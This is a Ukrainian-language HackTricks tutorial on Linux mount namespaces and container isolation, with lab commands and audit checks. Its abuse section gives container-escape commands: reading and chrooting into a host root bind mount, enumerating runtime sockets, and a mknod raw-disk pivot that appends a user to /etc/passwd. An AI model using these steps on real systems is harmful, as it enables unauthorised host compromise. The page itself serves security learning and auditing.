# Простір імен монтування

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Простір імен монтування контролює **таблицю монтувань**, яку бачить процес. Це одна з найважливіших функцій ізоляції контейнерів, оскільки коренева файлова система, bind mounts, монтування tmpfs, представлення procfs, доступ до sysfs і багато допоміжних монтувань, специфічних для runtime, описуються саме через цю таблицю монтувань. Два процеси можуть обидва отримувати доступ до `/`, `/proc`, `/sys` або `/tmp`, але те, до чого фактично ведуть ці шляхи, залежить від простору імен монтування, у якому вони перебувають.

З погляду container security простір імен монтування часто є межею між «це акуратно підготовлена файлова система застосунку» та «цей процес може безпосередньо бачити файлову систему хоста або впливати на неї». Саме тому bind mounts, томи `hostPath`, привілейовані операції монтування та доступні для запису представлення `/proc` або `/sys` пов’язані саме з цим простором імен.

## Робота

Коли runtime запускає контейнер, він зазвичай створює новий простір імен монтування, готує кореневу файлову систему для контейнера, монтує procfs та інші допоміжні файлові системи за потреби, а потім за бажанням додає bind mounts, монтування tmpfs, secrets, config maps або host paths. Після запуску процесу всередині цього простору імен набір монтувань, який він бачить, значною мірою відокремлений від стандартного представлення хоста. Хост усе ще може бачити справжню базову файлову систему, але контейнер бачить версію, зібрану для нього runtime.

Це потужний механізм, оскільки він дозволяє контейнеру вважати, що він має власну кореневу файлову систему, хоча всім і далі керує хост. Водночас це небезпечно, оскільки якщо runtime відкриє неправильне монтування, процес раптово отримає доступ до ресурсів хоста, для захисту яких решта моделі безпеки могла бути не призначена.

## Лабораторна робота

Ви можете створити приватний простір імен монтування за допомогою:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Якщо відкрити іншу shell поза цим простором імен і перевірити таблицю монтування, ви побачите, що монтування tmpfs існує лише всередині ізольованого простору імен монтування. Це корисна вправа, оскільки вона показує, що ізоляція монтувань — не абстрактна теорія; kernel буквально надає процесу іншу таблицю монтування.

Якщо відкрити іншу shell поза цим простором імен і перевірити таблицю монтування, монтування tmpfs існуватиме лише всередині ізольованого простору імен монтування.

Усередині containers швидке порівняння таке:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Другий приклад демонструє, наскільки легко runtime configuration може створити величезну проломину у файловій межі.

## Використання під час виконання

Docker, Podman, стеки на базі containerd і CRI-O покладаються на private mount namespace для звичайних контейнерів. Kubernetes використовує той самий механізм для volumes, projected secrets, config maps і монтувань `hostPath`. Середовища Incus/LXC також значною мірою покладаються на mount namespaces, особливо тому, що system containers часто відкривають більш повні та схожі на машинні файлові системи, ніж application containers.

Це означає, що під час аналізу проблеми з файловою системою контейнера ви зазвичай маєте справу не з ізольованою особливістю Docker. Ви маєте справу з проблемою mount namespace і runtime configuration, вираженою через платформу, яка запустила workload.

## Неправильні конфігурації

Найочевидніша й найнебезпечніша помилка — відкрити кореневу файлову систему host або інший чутливий шлях host через bind mount, наприклад `-v /:/host`, або використати writable `hostPath` у Kubernetes. На цьому етапі питання вже не в тому, «чи може контейнер якось escape?», а в тому, «який обсяг корисного вмісту host уже безпосередньо видимий і доступний для запису?». Writable host bind mount часто перетворює решту exploit на просте розміщення файлів, chrooting, зміну конфігурації або пошук runtime socket.

Ще одна поширена проблема — відкриття `/proc` або `/sys` host у спосіб, що обходить безпечніше container view. Це не звичайні data mounts, а інтерфейси до стану kernel і process. Якщо workload безпосередньо отримує доступ до версій host, багато припущень, на яких ґрунтується container hardening, перестають коректно діяти.

Захисти read-only також мають значення. Read-only root filesystem не захищає контейнер магічним чином, але прибирає значний обсяг staging space для attacker і ускладнює persistence, розміщення helper binaries та tampering із конфігурацією. І навпаки, writable root або writable host bind mount дає attacker простір для підготовки наступного кроку.

## Зловживання

Коли mount namespace використовується неправильно, attackers зазвичай роблять одну з чотирьох речей. Вони **читають дані host**, які мали залишатися поза контейнером. Вони **змінюють конфігурацію host** через writable bind mounts. Вони **монтують або перемонтовують додаткові ресурси**, якщо capabilities і seccomp це дозволяють. Або вони **отримують доступ до потужних sockets і runtime state directories**, які дають змогу попросити саму container platform надати їм більше доступу.

Якщо контейнер уже бачить файлову систему host, модель безпеки одразу змінюється.

Якщо ви підозрюєте host bind mount, спочатку перевірте, що саме доступно і чи доступне воно для запису:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Якщо кореневу файлову систему хоста змонтовано з доступом на запис, прямий доступ до хоста часто зводиться до простого:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Якщо метою є привілейований доступ до runtime, а не безпосереднє виконання chrooting, перелічіть сокети та стан runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Якщо присутній `CAP_SYS_ADMIN`, також перевірте, чи можна створювати нові монтування зсередини контейнера:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Повний приклад: pivot із двома shell через `mknod`

Більш спеціалізований шлях зловживання з'являється, коли користувач `root` у container може створювати блокові пристрої, host і container спільно використовують ідентичність користувача у корисний для цього спосіб, а attacker уже має foothold із низькими привілеями на host. У такій ситуації container може створити вузол пристрою, наприклад `/dev/sda`, а користувач host із низькими привілеями згодом може прочитати його через `/proc/<pid>/root/` для відповідного процесу container.<sup>[[1]](#references)</sup>

Усередині container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
На хості, від імені відповідного користувача з низькими привілеями, після визначення PID shell контейнера:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Важливий висновок полягає не в точному пошуку рядка CTF. Йдеться про те, що доступ до mount namespace через `/proc/<pid>/root/` може дозволити користувачу host повторно використовувати device nodes, створені container, навіть якщо політика пристроїв cgroup забороняла їхнє пряме використання всередині самого container.<sup>[[1]](#references)</sup>

## Перевірки

Ці команди потрібні, щоб показати view файлової системи, у якому фактично працює поточний процес. Мета — виявити mounts, похідні від host, чутливі шляхи з правом запису та все, що виглядає ширшим за звичайну root файлової систему application container.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Що тут є цікавого:

- Bind mounts із host, особливо `/`, `/proc`, `/sys`, директорії зі станом runtime або розташування socket, мають одразу привертати увагу.
- Неочікувані read-write mounts зазвичай важливіші за велику кількість read-only допоміжних mounts.
- `mountinfo` часто є найкращим місцем, щоб визначити, чи шлях справді походить від host, чи підтримується overlay.

Ці перевірки встановлюють, **які ресурси видимі в цьому namespace**, **які з них походять від host**, а також **які з них доступні для запису або є чутливими з погляду безпеки**.
